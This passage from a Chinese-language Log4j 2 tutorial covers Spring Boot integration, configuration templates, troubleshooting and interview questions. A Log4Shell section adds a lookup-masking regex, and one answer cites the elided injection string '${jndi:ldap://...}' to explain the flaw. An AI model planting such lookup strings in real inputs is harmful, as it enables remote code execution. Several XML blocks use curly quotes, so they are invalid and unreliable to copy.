    </AsyncRoot>
</Loggers>
```

# 7. 与 Spring Boot 集成

## 7.1 替换默认 Logback

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <!-- 排除默认的 Logback -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>

<!-- 添加 Log4j 2 -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
</dependency>
```

## 7.2 application.yml 配置

Spring Boot 2.x+ 支持通过 `logging.log4j2.config.override` 进行覆盖配置：

```yaml
logging:
  level:
    root: INFO
    com.example: DEBUG
  pattern:
    console: "%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n"
  log4j2:
    config:
      # 指定外部配置文件位置
      # 如果 log4j2.xml 在 classpath 上则自动加载
```

## 7.3 log4j2-spring.xml

Spring Boot 推荐使用 `log4j2-spring.xml`（支持 Spring Boot 扩展）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration monitorInterval="30">
    <Properties>
        <Property name="LOG_PATH">${sys:LOG_PATH:-./logs}</Property>
        <Property name="APP_NAME">${spring:spring.application.name:-app}</Property>
    </Properties>

    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
        </Console>

        <RollingFile name="RollingFile"
                     fileName="${LOG_PATH}/${APP_NAME}.log"
                     filePattern="${LOG_PATH}/${APP_NAME}.%d{yyyy-MM-dd}.%i.log.gz">
            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n" />
            <Policies>
                <TimeBasedTriggeringPolicy />
                <SizeBasedTriggeringPolicy size="100MB" />
            </Policies>
            <DefaultRolloverStrategy max="30" />
        </RollingFile>
    </Appenders>

    <Loggers>
        <Logger name="org.springframework" level="WARN" />
        <Logger name="org.hibernate" level="WARN" />
        <Logger name="com.example" level="DEBUG" />

        <Root level="INFO">
            <AppenderRef ref="Console" />
            <AppenderRef ref="RollingFile" />
        </Root>
    </Loggers>
</Configuration>
```

## 7.4 Spring Profile 特定配置

```xml
<Configuration>
    ...
    <Loggers>
        <!-- 开发环境：DEBUG + Console -->
        <SpringProfile name="dev">
            <Root level="DEBUG">
                <AppenderRef ref="Console" />
            </Root>
        </SpringProfile>

        <!-- 生产环境：INFO + 异步文件 -->
        <SpringProfile name="prod">
            <AsyncRoot level="INFO">
                <AppenderRef ref="RollingFile" />
            </AsyncRoot>
        </SpringProfile>

        <!-- 默认 -->
        <Root level="INFO">
            <AppenderRef ref="Console" />
        </Root>
    </Loggers>
</Configuration>
```

## 7.5 Spring Boot 的 Log4j 2 Lookup

Spring Boot 为 Log4j 2 提供了 `SpringLookup`：

```xml
<Property name="app-name">${spring:spring.application.name}</Property>
<Property name="profile">${spring:spring.profiles.active:-default}</Property>
```

## 7.6 编程方式配置

```java
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

@SpringBootApplication
public class Application {
    public static void main(String[] args) {
        // 动态修改日志级别
        Configurator.setLevel("com.example", Level.DEBUG);
        Configurator.setLevel("org.springframework", Level.WARN);

        // 通过 LoggerContext 获取详细控制
        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        ctx.getConfiguration().getLoggerConfig("com.example")
           .setLevel(Level.DEBUG);
        ctx.updateLoggers();

        SpringApplication.run(Application.class, args);
    }
}
```

# 8. 最佳实践与常见问题

## 8.1 最佳实践

### 8.1.1 生产环境配置模板

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration monitorInterval=“30” status=“WARN”>
    <Properties>
        <Property name="log-path">/var/log/myapp</Property>
        <Property name="pattern">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n</Property>
    </Properties>

    <Appenders>
        <!-- 控制台：只输出 WARN+ -->
        <Console name=”Console” target=“SYSTEM_OUT”>
            <ThresholdFilter level=“WARN” onMatch=“ACCEPT” onMismatch=“DENY” />
            <PatternLayout pattern=“${pattern}” />
        </Console>

        <!-- 全量日志：异步 -->
        <RollingRandomAccessFile name=“RollingFile”
                                  fileName=“${log-path}/app.log”
                                  filePattern=“${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz”>
            <PatternLayout pattern=“${pattern}” />
            <Policies>
                <TimeBasedTriggeringPolicy interval=“1” />
                <SizeBasedTriggeringPolicy size=“100 MB” />
            </Policies>
            <DefaultRolloverStrategy max=“30” totalSizeCap=“10GB” />
        </RollingRandomAccessFile>

        <!-- 错误日志单独文件 -->
        <RollingRandomAccessFile name=“ErrorFile”
                                  fileName=“${log-path}/error.log”
                                  filePattern=“${log-path}/error.%d{yyyy-MM-dd}.%i.log.gz”>
            <ThresholdFilter level=“ERROR” onMatch=“ACCEPT” onMismatch=“DENY” />
            <PatternLayout pattern=“${pattern}” />
            <Policies>
                <TimeBasedTriggeringPolicy interval=“1” />
                <SizeBasedTriggeringPolicy size=“50 MB” />
            </Policies>
            <DefaultRolloverStrategy max=“60” />
        </RollingRandomAccessFile>

        <!-- JSON 格式给日志收集系统 -->
        <RollingRandomAccessFile name=“JsonFile”
                                  fileName=“${log-path}/app.json”
                                  filePattern=“${log-path}/app.%d{yyyy-MM-dd}.%i.json.gz”>
            <JsonLayout compact=“true” eventEol=“true” properties=“true” />
            <Policies>
                <TimeBasedTriggeringPolicy interval=“1” />
                <SizeBasedTriggeringPolicy size=“100 MB” />
            </Policies>
        </RollingRandomAccessFile>
    </Appenders>

    <Loggers>
        <Logger name=“org.springframework” level=“WARN” />
        <Logger name=“org.hibernate” level=“WARN” />
        <Logger name=“com.example” level=“INFO” />

        <AsyncRoot level=“INFO”>
            <AppenderRef ref=“Console” />
            <AppenderRef ref=“RollingFile” />
            <AppenderRef ref=“ErrorFile” />
            <AppenderRef ref=“JsonFile” />
        </AsyncRoot>
    </Loggers>
</Configuration>
```

### 8.1.2 Logger 获取规范

```java
// 推荐：类静态变量
private static final Logger log = LogManager.getLogger(MyService.class);

// 可读性更好的方式（Log4j 2 推荐）
private static final Logger log = LogManager.getLogger();

// 实例变量（适用于需要序列化的场景）
private final Logger log = LogManager.getLogger(getClass());
```

### 8.1.3 日志消息安全（防范 Log4Shell）

```java
// 2.17.0+ 默认安全
// 旧版本修复：设置系统属性
System.setProperty("log4j2.formatMsgNoLookups", "true");

// 升级到 2.17.0+
// 移除 Message Lookup 功能

// 输入验证：不要直接记录用户输入而不过滤
public void logUserAction(String userInput) {
    // 对用户输入进行清理
    String sanitized = userInput.replaceAll("\\$\\{[^}]+\\}", "***");
    log.info("User action: {}", sanitized);
}
```

### 8.1.4 使用 Message 接口

```java
import org.apache.logging.log4j.message.*;

// 结构化消息
MapMessage msg = new MapMessage();
msg.put("event", "user_login");
msg.put("userId", userId);
msg.put("ip", ipAddress);
log.info(msg);

// 格式化消息
log.info("User {} logged in from {}", userId, ipAddress);

// 定时/格式化消息
StringFormatterMessage fmtMsg = new StringFormatterMessage(
    "User %s logged in from %s", userId, ipAddress);
log.info(fmtMsg);

// 对象消息
log.info(new ObjectMessage(user));
```

### 8.1.5 使用 Log4j 2 API 的优势

```java
// Log4j 2 API 独有特性
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.message.MapMessage;

// Lambda 表达式延迟求值
log.info("Processing order: {}", () -> orderService.getExpensiveSummary());

// 条件日志
log.info("User: {}, Role: {}", user::getName, user::getRole);

// 级别检查
if (log.isDebugEnabled()) {
    log.debug("Complex: {}", computeExpensiveValue());
}
```

## 8.2 常见问题

### 8.2.1 配置文件未找到

**症状**：启动时输出 WARNING 提示找不到配置文件。

**解决**：确保配置文件在 classpath 的根目录，文件名正确。

```
src/main/resources/
├── log4j2.xml        # 或 log4j2-spring.xml（Spring Boot）
├── log4j2.json
├── log4j2.yaml
└── log4j2.properties
```

### 8.2.2 异步日志丢失

**症状**：应用关闭时尚未写入磁盘的日志丢失。

**解决**：注册 JVM 关闭钩子：

```java
// 方式一：LogManager 自动注册关闭钩子（默认）
// 方式二：手动确保
LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
ctx.stop();  // 在应用关闭时调用
```

### 8.2.3 Disruptor 队列满

**症状**：日志写入变慢，应用线程阻塞。

**解决**：
```bash
# 增大 RingBuffer
-DAsyncLoggerConfig.RingBufferSize=262144
# 或选择不同的等待策略
-DAsyncLoggerConfig.WaitStrategy=yield
```

### 8.2.4 SLF4J + Log4j 2 绑定冲突

**症状**：启动时出现 SLF4J 多个绑定警告。

**排查**：
```bash
mvn dependency:tree | findstr slf4j
mvn dependency:tree | findstr logback
```

**解决**：排除冲突依赖：
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```

### 8.2.5 垃圾-free 模式问题

**症状**：启用垃圾-free 模式后某些 Layout 不工作。

**解决**：
- `JsonLayout` 在垃圾-free 模式下可能有问题，使用 `JsonTemplateLayout` 替代
- `Console Appender` 不完全支持垃圾-free
- 使用 `RandomAccessFile Appender` 获得最佳垃圾-free 效果

### 8.2.6 配置热重载不生效

**解决**：
```xml
<!-- 确认 monitorInterval 已设置 -->
<Configuration monitorInterval=“30”>
<!-- 确认文件路径正确，检查文件权限 -->
```

### 8.2.7 JVM 参数配置

```bash
# 完整的 Log4j 2 优化参数
-Dlog4j2.enable.threadlocals=true
-Dlog4j2.enable.direct.encoders=true
-DAsyncLoggerConfig.RingBufferSize=131072
-DAsyncLoggerConfig.WaitStrategy=sleep
-Dlog4j2.formatMsgNoLookups=true
```

# 9. 面试要点

## 9.1 基础概念

**Q: Log4j 2 相比 Logback 的核心优势是什么？**
A: Log4j 2 的核心优势是：基于 LMAX Disruptor 的异步 Logger 提供更高的吞吐量（可达每秒千万级）；支持垃圾-free 日志模式减少 GC 压力；更灵活的插件架构和 Lookup 机制；支持多种配置格式（XML/JSON/YAML/Properties）。

**Q: Log4j 2 的架构分层是什么？**
A: Log4j 2 分为两个主要模块：log4j-api（公共 API，提供 Logger 接口和 LogManager）和 log4j-core（核心实现，包含 Appender、Layout、Filter、异步日志引擎等）。

**Q: Log4j 2 的配置文件查找顺序？**
A: Log4j 2 按顺序查找：log4j2-spring.xml（Spring Boot）→ log4j2-test.xml → log4j2.xml → log4j2.json → log4j2.yaml → log4j2.properties。如果都未找到，使用默认配置（仅输出 ERROR 到控制台）。

## 9.2 高级原理

**Q: Disruptor 相比 BlockingQueue 的优势？**
A: Disruptor 使用环形缓冲区（RingBuffer）预分配对象，无锁并发（CAS 替代 synchronized），缓存行填充避免伪共享。相比 BlockingQueue，吞吐量提升数倍，延迟更低且更稳定。

**Q: 垃圾-free 日志是如何实现的？**
A: 通过 ThreadLocal 复用 StringBuilder 等缓冲区，使用直接编码器绕过中间字符串创建，预分配 LogEvent 对象，使用对象池化技术。最终实现日志路径中不产生临时对象，降低 GC 频率。

**Q: Log4Shell 漏洞的原理和修复方案？**
A: 漏洞原理：Log4j 2 的 JNDI Lookup 允许在日志消息中执行 `${jndi:ldap://...}`，攻击者可通过恶意输入触发远程类加载实现 RCE。修复：升级到 2.17.0+ 版本，该版本默认禁用 JNDI Lookup 并限制 LDAP 协议。

**Q: 什么是 Log4j 2 的 Lookup 机制？**
A: Lookup 是 Log4j 2 的变量解析机制，支持从系统属性（`${sys:key}`）、环境变量（`${env:key}`）、JNDI（`${jndi:name}`）、Thread Context（`${ctx:key}`）等来源动态获取值，在配置文件中使用 `${}` 语法。

## 9.3 实践问题

**Q: 如何选择同步 Logger 和异步 Logger？**
A: 同步 Logger 适用于：低吞吐但需要保证日志不丢失的场景（审计日志）、低延迟要求不高的场景。异步 Logger 适用于：高吞吐业务（每秒上万日志）、I/O 密集场景、对应用性能敏感的生产环境。

**Q: 如何将 Log4j 1.x 迁移到 Log4j 2？**
A: 使用 log4j-1.2-api 桥接模块替代 log4j.jar，该模块将 Log4j 1.x 的 API 调用转发到 Log4j 2。同时替换配置文件格式（properties → xml/json），更新自定义 Appender（如有）。

**Q: Log4j 2 的 Thread Context 和 SLF4J 的 MDC 有什么区别？**
A: Log4j 2 的 ThreadContext 功能更丰富：支持 Map 模式（key-value）和 Stack 模式（push/pop），而 MDC 只支持 Map 模式。两者在异步场景中都需要手动传递上下文。

**Q: 生产环境中如何配置 Log4j 2 以获得最佳性能？**
A: 使用 RollingRandomAccessFile Appender 替代普通 File Appender；使用异步 Logger 包装业务逻辑 Appender；启用垃圾-free 模式（threadlocals + direct encoders）；选择合适的 RingBuffer 大小和等待策略；避免使用 %C、%M、%L 等高开销转换字。

**Q: Log4j 2 和 SLF4J 的关系？**
A: Log4j 2 提供了自己的 API（log4j-api），同时也提供了 SLF4J 绑定（log4j-slf4j-impl）。应用层可以选择直接使用 Log4j 2 API（可以访问 Log4j 2 独有特性）或通过 SLF4J 门面（便于切换框架）。通过 log4j-to-slf4j 桥接，也可以将 Log4j 2 API 的调用重定向到其他 SLF4J 实现。
